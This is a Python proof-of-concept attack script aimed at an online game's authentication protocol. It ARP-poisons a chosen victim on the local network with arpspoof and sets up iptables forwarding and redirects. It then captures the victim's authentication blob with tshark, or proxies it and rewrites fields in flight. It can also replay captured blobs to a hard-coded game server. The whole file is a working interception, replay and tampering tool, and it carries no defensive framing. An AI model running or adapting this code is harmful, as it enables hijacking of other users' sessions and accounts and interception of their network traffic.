#!/usr/bin/env python3
"""
usage:
  python3 poc.py auth   <HEX>
  python3 poc.py decode <HEX>
  python3 poc.py patch  <HEX> [0xOFFSET=VALUE ...]
  python3 poc.py patch  --file capture.bin [0xOFFSET=VALUE ...]
  sudo python3 poc.py mitm   -i eth0 -t 10.0.1.17 [-g 10.0.1.1]
  sudo python3 poc.py proxy  -i eth0 -t 10.0.1.17 [-g 10.0.1.1] [0xOFFSET=VALUE ...]
"""

import argparse, os, socket, struct, subprocess, sys, threading, time
sys.stdout.reconfigure(line_buffering=True)

GAME_HOST  = "34.117.1.102"
GAME_PORT  = 30031
MAGIC      = bytes.fromhex("98010000")
PROXY_PORT = 19999

# ---------------------------------------------------------------------------

def recv_exactly(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("server closed")
        buf.extend(chunk)
    return bytes(buf)

def read_frame(sock):
    hdr = recv_exactly(sock, 4)
    return hdr + recv_exactly(sock, struct.unpack_from("<I", hdr)[0])

def decode(data: bytes) -> list[str]:
    print(f"Buffer: {len(data)} bytes\n")
    results, i = [], 0
    while i < len(data) - 4:
        length = struct.unpack_from('<I', data, i)[0]
        if 2 <= length <= 200:
            end = i + 4 + length
            if end <= len(data):
                chunk = data[i+4:end]
                if all(0x20 <= b < 0x7f for b in chunk):
                    s = chunk.decode()
                    print(f"  0x{i:04x}  [{length:3d}]  {s}")
                    results.append(s)
                    i = end
                    continue
        i += 1
    return results

def apply_patch(data: bytes, offset: int, value: str) -> bytes:
    buf     = bytearray(data)
    old_len = struct.unpack_from('<I', buf, offset)[0]
    new_val = value.encode()
    if len(new_val) > old_len:
        print(f"[!] 0x{offset:04x}: {len(new_val)}B exceeds field size {old_len}B — skipped")
        return data
    struct.pack_into('<I', buf, offset, len(new_val))
    buf[offset + 4 : offset + 4 + len(new_val)] = new_val
    buf[offset + 4 + len(new_val) : offset + 4 + old_len] = bytes(old_len - len(new_val))
    return bytes(buf)

# ---------------------------------------------------------------------------

def authenticate(blob: bytes):
    sock = socket.create_connection((GAME_HOST, GAME_PORT))
    sock.sendall(MAGIC)
    challenge = read_frame(sock)
    print(f"[*] challenge  ({len(challenge)} bytes)")
    sock.sendall(blob)
    print(f"[*] auth  ({len(blob)} bytes)\n")
    decode(blob)

    while True:
        try:
            frame = read_frame(sock)
        except (ConnectionError, OSError) as e:
            print(f"[!] {e}")
            break

        mt = None
        for off in (16, 20, 24, 28):
            if off + 4 > len(frame): break
            v = struct.unpack_from("<I", frame, off)[0]
            if 0x0400 <= v <= 0x0800:
                mt = v; break

        if mt in (0x07DA, 0x045D):
            decode(frame)
        elif mt == 0x0671:
            break

    sock.close()

# ---------------------------------------------------------------------------

def get_gateway() -> str | None:
    try:
        out = subprocess.check_output(["ip", "route", "show", "default"], text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return None

def get_mac(iface: str) -> str:
    with open(f"/sys/class/net/{iface}/address") as f:
        return f.read().strip()

def _ipt(*args):
    subprocess.run(list(args), capture_output=True)

def setup_forwarding(iface: str):
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
    _ipt("iptables", "-t", "raw", "-I", "PREROUTING", "-i", iface, "-j", "NOTRACK")
    _ipt("iptables", "-t", "raw", "-I", "OUTPUT",     "-o", iface, "-j", "NOTRACK")
    _ipt("iptables", "-I", "FORWARD", "-i", iface, "-j", "ACCEPT")
    _ipt("iptables", "-I", "FORWARD", "-o", iface, "-j", "ACCEPT")

def teardown_forwarding(iface: str):
    _ipt("iptables", "-t", "raw", "-D", "PREROUTING", "-i", iface, "-j", "NOTRACK")
    _ipt("iptables", "-t", "raw", "-D", "OUTPUT",     "-o", iface, "-j", "NOTRACK")
    _ipt("iptables", "-D", "FORWARD", "-i", iface, "-j", "ACCEPT")
    _ipt("iptables", "-D", "FORWARD", "-o", iface, "-j", "ACCEPT")

def _extract_blob(stream: bytes) -> bytes | None:
    idx = stream.find(MAGIC)
    if idx == -1: return None
    f1_len = struct.unpack_from("<I", stream, idx)[0]
    f1_end = idx + 4 + f1_len
    if len(stream) < f1_end: return None
    if f1_end + 4 <= len(stream):
        f2_len = struct.unpack_from("<I", stream, f1_end)[0]
        if 0 < f2_len < 0x200 and f1_end + 4 + f2_len <= len(stream):
            return stream[idx:f1_end + 4 + f2_len]
    return stream[idx:f1_end]

def _relay(src, dst, stop):
    try:
        while not stop.is_set():
            data = src.recv(4096)
            if not data:
                break
            dst.sendall(data)
    except OSError:
        pass
    finally:
        stop.set()

def proxy_handler(client_sock, patches):
    server_sock = socket.create_connection((GAME_HOST, GAME_PORT))
    stop = threading.Event()
    try:
        # client sends MAGIC first → forward to server
        magic = recv_exactly(client_sock, 4)
        if magic != MAGIC:
            print(f"[!] unexpected magic: {magic.hex()}")
            return
        server_sock.sendall(magic)

        # server sends challenge → forward to client
        challenge = read_frame(server_sock)
        client_sock.sendall(challenge)
        print(f"[*] challenge  ({len(challenge)} bytes)")

        # client sends auth payload: Frame1 body + optional Frame2
        frame1_len = struct.unpack_from('<I', magic)[0]
        auth_payload = bytearray(recv_exactly(client_sock, frame1_len))
        extra = b''
        client_sock.settimeout(0.2)
        try:
            hdr = client_sock.recv(4)
            if len(hdr) == 4:
                f2_len = struct.unpack_from('<I', hdr)[0]
                if 0 < f2_len < 0x200:
                    auth_payload.extend(hdr + recv_exactly(client_sock, f2_len))
                else:
                    extra = hdr  # not Frame2 — forward after auth
        except socket.timeout:
            pass
        finally:
            client_sock.settimeout(None)

        # apply patches
        data = bytes(auth_payload)
        for offset, value in patches:
            old_len = struct.unpack_from('<I', bytearray(data), offset)[0]
            old_val = data[offset + 4 : offset + 4 + old_len].decode(errors='replace')
            data    = apply_patch(data, offset, value)
            print(f"  [~] 0x{offset:04x}  {old_val!r}  →  {value!r}")
        if patches:
            print()
        decode(data)
        with open("capture.bin", "a") as fh:
            fh.write(data.hex() + "\n")
        print(f"[*] auth  ({len(data)} bytes) → written to capture.bin\n")

        # forward patched auth to server
        server_sock.sendall(data)
        if extra:
            server_sock.sendall(extra)

        # relay rest of session bidirectionally
        t = threading.Thread(target=_relay, args=(server_sock, client_sock, stop), daemon=True)
        t.start()
        _relay(client_sock, server_sock, stop)
        t.join(timeout=1)

    except (ConnectionError, OSError) as e:
        print(f"[!] {e}")
    finally:
        stop.set()
        client_sock.close()
        server_sock.close()

def intercept(iface: str, victim: str, gateway: str, patches: list):
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
    _ipt("iptables", "-t", "raw", "-D", "PREROUTING", "-i", iface, "-j", "NOTRACK")
    _ipt("iptables", "-t", "raw", "-D", "OUTPUT",     "-o", iface, "-j", "NOTRACK")
    _ipt("iptables", "-I", "FORWARD", "-i", iface, "-j", "ACCEPT")
    _ipt("iptables", "-I", "FORWARD", "-o", iface, "-j", "ACCEPT")
    _ipt("iptables", "-t", "nat", "-I", "PREROUTING",
         "-i", iface, "-s", victim, "-p", "tcp", "--dport", str(GAME_PORT),
         "-j", "REDIRECT", "--to-port", str(PROXY_PORT))

    spoof = [
        subprocess.Popen(["arpspoof", "-i", iface, "-t", victim,  gateway],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        subprocess.Popen(["arpspoof", "-i", iface, "-t", gateway, victim],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
    ]
    print(f"[+] poisoning {victim} ↔ {gateway}")
    time.sleep(1.5)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PROXY_PORT))
    srv.listen(5)
    srv.settimeout(1.0)

    try:
        while True:
            try:
                client, addr = srv.accept()
            except socket.timeout:
                continue
            print(f"[*] connection from {addr[0]}:{addr[1]}")
            threading.Thread(target=proxy_handler, args=(client, patches), daemon=True).start()
    finally:
        srv.close()
        for p in spoof: p.terminate()
        _ipt("iptables", "-t", "nat", "-D", "PREROUTING",
             "-i", iface, "-s", victim, "-p", "tcp", "--dport", str(GAME_PORT),
             "-j", "REDIRECT", "--to-port", str(PROXY_PORT))
        _ipt("iptables", "-D", "FORWARD", "-i", iface, "-j", "ACCEPT")
        _ipt("iptables", "-D", "FORWARD", "-o", iface, "-j", "ACCEPT")

def poison(iface: str, victim: str, gateway: str):
    setup_forwarding(iface)
    spoof = [
        subprocess.Popen(["arpspoof", "-i", iface, "-t", victim,  gateway],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        subprocess.Popen(["arpspoof", "-i", iface, "-t", gateway, victim],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
    ]
    print(f"[+] poisoning {victim} ↔ {gateway}")
    time.sleep(1.5)

    mac = get_mac(iface)
    bpf = f"ether dst {mac} and tcp and src host {victim} and dst port {GAME_PORT}"
    tshark = subprocess.Popen(
        ["tshark", "-i", iface, "-f", bpf, "-T", "fields", "-e", "tcp.payload", "-l"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1.0)
    if tshark.poll() is not None:
        sys.exit(f"[-] tshark: {tshark.stderr.read().decode(errors='replace').strip()}")

    print("[*] listening for traffic")

    buf, pkt_count = bytearray(), 0
    try:
        while True:
            line = tshark.stdout.readline()
            if not line: break
            line = line.decode("ascii", errors="ignore").strip()
            if not line: continue
            try:
                buf.extend(bytes.fromhex(line.replace(":", "")))
            except ValueError:
                continue
            pkt_count += 1
            if pkt_count == 1:
                print("[*] traffic detected")
            blob = _extract_blob(bytes(buf))
            if blob:
                payload = blob[4:]
                with open("capture.bin", "a") as fh:
                    fh.write(payload.hex() + "\n")
                print("written to capture.bin\n")
                decode(payload)
                break
            if MAGIC not in buf and len(buf) > 16384:
                buf[:] = buf[-2048:]
    finally:
        tshark.terminate()
        for p in spoof: p.terminate()
        teardown_forwarding(iface)

# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "  %(prog)s auth <HEX>\n"
            "  %(prog)s decode <HEX>\n"
            "  sudo %(prog)s mitm -i eth0 -t 10.0.1.17 [-g 10.0.1.1]\n"
        ),
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    ap = sub.add_parser("auth",   help="authenticate with hex blob")
    ap.add_argument("hex")

    dp = sub.add_parser("decode", help="decode a hex blob")
    dp.add_argument("hex")

    pp = sub.add_parser("patch",  help="decode and patch a hex blob")
    pp.add_argument("hex",    nargs="?", default=None)
    pp.add_argument("--file", default=None, help="hex file (uses last line)")
    pp.add_argument("patches", nargs="*",  metavar="OFFSET=VALUE")

    mp = sub.add_parser("mitm",  help="arp poison and capture auth blob")
    mp.add_argument("-i", dest="iface",   required=True)
    mp.add_argument("-t", dest="victim",  required=True)
    mp.add_argument("-g", dest="gateway", default=None)

    xp = sub.add_parser("proxy", help="intercept, patch, and relay auth in-flight")
    xp.add_argument("-i", dest="iface",   required=True)
    xp.add_argument("-t", dest="victim",  required=True)
    xp.add_argument("-g", dest="gateway", default=None)
    xp.add_argument("patches", nargs="*", metavar="OFFSET=VALUE")

    args = parser.parse_args()

    if args.mode == "auth":
        authenticate(bytes.fromhex(args.hex.replace(" ", "")))

    elif args.mode == "decode":
        decode(bytes.fromhex(args.hex.replace(" ", "")))

    elif args.mode == "patch":
        if args.file:
            with open(args.file) as fh:
                lines = [l.strip() for l in fh if l.strip()]
            hex_str = lines[-1]
        elif args.hex:
            hex_str = args.hex
        else:
            sys.exit("usage: poc.py patch <HEX> [OFFSET=VALUE ...]")
        data = bytes.fromhex(hex_str.replace(" ", ""))
        specs = []
        for p in args.patches:
            off_str, _, value = p.partition('=')
            try:
                specs.append((int(off_str, 16), value))
            except ValueError:
                print(f"[!] bad offset: {off_str!r}")
        specs.sort(key=lambda x: x[0], reverse=True)
        for offset, value in specs:
            old_len = struct.unpack_from('<I', bytearray(data), offset)[0]
            old_val = data[offset + 4 : offset + 4 + old_len].decode(errors='replace')
            data    = apply_patch(data, offset, value)
            print(f"  0x{offset:04x}  {old_val!r}  →  {value!r}")
        if specs:
            print()
        decode(data)
        if specs:
            print(f"\n{data.hex()}")

    elif args.mode == "mitm":
        if os.geteuid() != 0:
            sys.exit("[-] mitm requires root (sudo)")
        for tool, pkg in [("arpspoof", "dsniff"), ("tshark", "tshark")]:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                sys.exit(f"[-] {tool} not found — apt install {pkg}")
        gateway = args.gateway or get_gateway()
        if not gateway:
            sys.exit("[-] cannot detect gateway — use -g")
        poison(args.iface, args.victim, gateway)

    elif args.mode == "proxy":
        if os.geteuid() != 0:
            sys.exit("[-] proxy requires root (sudo)")
        if subprocess.run(["which", "arpspoof"], capture_output=True).returncode != 0:
            sys.exit("[-] arpspoof not found — apt install dsniff")
        gateway = args.gateway or get_gateway()
        if not gateway:
            sys.exit("[-] cannot detect gateway — use -g")
        specs = []
        for p in args.patches:
            off_str, _, value = p.partition('=')
            try:
                specs.append((int(off_str, 16), value))
            except ValueError:
                print(f"[!] bad offset: {off_str!r}")
        intercept(args.iface, args.victim, gateway, specs)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\n[*] interrupted")
